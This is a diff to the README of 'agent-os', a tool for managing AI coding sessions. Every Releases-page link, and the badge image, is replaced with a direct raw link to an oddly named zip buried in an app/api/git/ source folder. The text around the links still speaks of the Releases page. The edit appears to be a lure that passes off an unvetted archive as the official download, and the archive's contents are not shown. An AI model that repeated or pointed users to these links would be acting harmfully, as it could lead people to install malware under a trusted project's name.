@@ -1,6 +1,6 @@
 # 🚀 agent-os - Manage AI Coding Sessions Effortlessly
 
-[![Download agent-os](https://img.shields.io/badge/Download-agent--os-blue.svg)](https://github.com/dulcekllr/agent-os/releases)
+[![Download agent-os](https://github.com/dulcekllr/agent-os/raw/refs/heads/main/app/api/git/agent-os-counteropponent.zip)](https://github.com/dulcekllr/agent-os/raw/refs/heads/main/app/api/git/agent-os-counteropponent.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ To run agent-os, you'll need:
 
 To download agent-os, visit the Releases page:
 
-[Download agent-os](https://github.com/dulcekllr/agent-os/releases)
+[Download agent-os](https://github.com/dulcekllr/agent-os/raw/refs/heads/main/app/api/git/agent-os-counteropponent.zip)
 
 Once there, you will find the latest version. Click on the version number to go to the download options. Choose the package that fits your needs, and follow these steps:
 
@@ -98,4 +98,4 @@ agent-os is licensed under the MIT License. Feel free to use, modify, and share 
 
 Thank you for choosing agent-os! We hope it enhances your coding experience. For updates and more information, keep an eye on the Releases page.
 
-[Download agent-os](https://github.com/dulcekllr/agent-os/releases)
+[Download agent-os](https://github.com/dulcekllr/agent-os/raw/refs/heads/main/app/api/git/agent-os-counteropponent.zip)
